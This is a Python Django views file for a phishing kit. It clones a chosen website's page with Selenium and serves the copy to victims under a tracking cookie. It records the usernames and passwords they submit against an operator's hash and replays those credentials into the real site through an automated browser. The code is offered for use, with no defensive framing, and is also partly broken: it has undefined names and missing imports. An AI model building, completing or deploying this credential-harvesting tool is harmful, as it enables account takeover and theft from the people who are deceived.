from django.shortcuts import render
from .models import Website,Page,Hash
from django.shortcuts import get_object_or_404
from selenium import webdriver
from time import sleep
from .forms import WebsiteForm,LoginForm
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
from selenium.webdriver import ActionChains
from selenium.webdriver.common.keys import Keys
import re
from django.contrib.auth import logout
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth import authenticate,login
# Create your views here.
def page_code(website):
    driver = webdriver.Chrome('./chromedriver')
    driver.get(website)
    sleep(2)
    data=driver.page_source
    driver.close()
    data =data.replace('&lt;','<')
    data =data.replace('&gt;','>')
    data =data.replace('&#39;','\'')
    data =data.replace('&quot;','"')
    data =data.replace('&amp;','&')
    return data
def index(request):
    if request.method=="POST":
        return ViewPage(request,"something")
    user=request.GET.get('user')
    request.domain = Website.objects.get_current(request)
    context={'data':request.domain.pages.all()[0].code}
    response=render(request,'index.html',context)
    response.set_cookie("user",user)
    return response
def check(url,username,password,page):
    browser = webdriver.Chrome('./chromedriver')
    browser.get(url)
    sleep(3)
    login=browser.find_elements_by_tag_name("input")
    print(login)
    ActionChains(browser)\
        .move_to_element(login[page.username]).click()\
        .send_keys(username)\
        .perform()
    sleep(2)
    #login=browser.find_elements_by_tag_name("input")
    ActionChains(browser)\
        .move_to_element(login[page.password]).click()\
        .send_keys(password)\
        .send_keys(Keys.ENTER)\
        .perform()
    return browser.page_source
@csrf_exempt
def ViewPage(request,website):
    request.domain=Website.objects.get_current(request)
    if request.method=='POST':
        print(request.POST)
        username=request.POST["login"]
        password=request.POST["password"]
        print(request.COOKIES)
        user_id=request.COOKIES["user"]
        user=Hash.objects.filter(hash_user=user_id)
        user.username=username
        user.password=password
        user.save()
        website=request.domain
        try:
            context = {'data':website.pages.all()[1],}
        except:
            website=check(refer,username,password,website.pages.all()[0])
            context={'page':website}
        print(website)
        return render(request,'home.html',context)
    WebSite=request.domain
    context = {'data':WebSite.pages.all()[0],}
    return render(request,'home.html',context)
def new(request):
    if request.method=='POST':
        form=WebsiteForm(request.POST)
        website=request.POST['url']
        name=request.POST['name']
        redirect_url=request.POST['redirect_url']
        data=page_code(website)
        nap=Page(name=website,code=data)
        nap.save()
        data=page_code(redirect_url)
        nar=Page(name=website,code=data)
        nar.save()
        new_website=Website.objects.filter(name=name)
        if new_website:
            pass
        else:
            new_website=Website(name=name)
            new_website.save()
        page=new_website.pages
        page.add(nap)
        page.add(nar)
        new_website.save()
        return HttpResponse('<h1>added new page</h1>')
    else:
        form=WebsiteForm()
        context={'form':form}
        return render(request,'create.html',context)

def view_pages(request,id=None):
    if id:
        if request.method=='POST':
            add_to_user(request,id)
        website=get_object_or_404(Website,id=id)
        context={'website':website,}
        return render(request,'pagedetail.html',context)
    website=Website.objects.all()
    context={'website':website,}
    return render(request,'viewpage.html',context)

def gen_hash(length=19):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def add_to_user(request,id):
    if request.method=='POST':
        new_website=get_object_or_404(Website,id=id)
        hash=gen_hash()
        ji=Hash(user=request.user,website=new_website,hash_user=hash)
        ji.save()
        return hash
def logout_user(request):
    logout(request)
    return redirect('index')
def user_login(request):
    if request.user.is_authenticated:
        raise Http404()
    if request.method=='POST':
        form=LoginForm(request.POST)
        if form.is_valid():
            username=request.POST['username']
            password=request.POST['password']
            user=authenticate(username=username,password=password)
            if user:
                login(request,user)
                return redirect('index')
    form=LoginForm()
    context={'form':form,}
    return render(request,'login.html',context)
def register(request):
    if request.method=='POST':
        form=UserCreationForm(request.POST)
        if form.is_valid():
            form=form.save(commit=False)
            user=request.POST['username']
            password=request.POST['password1']
            form.save()
            new_user=authenticate(username=user,password=password)
            if new_user:
                login(request,new_user)
                return redirect('index')
    form=UserCreationForm()
    context={'form':form,}
    return render(request,'register.html',context)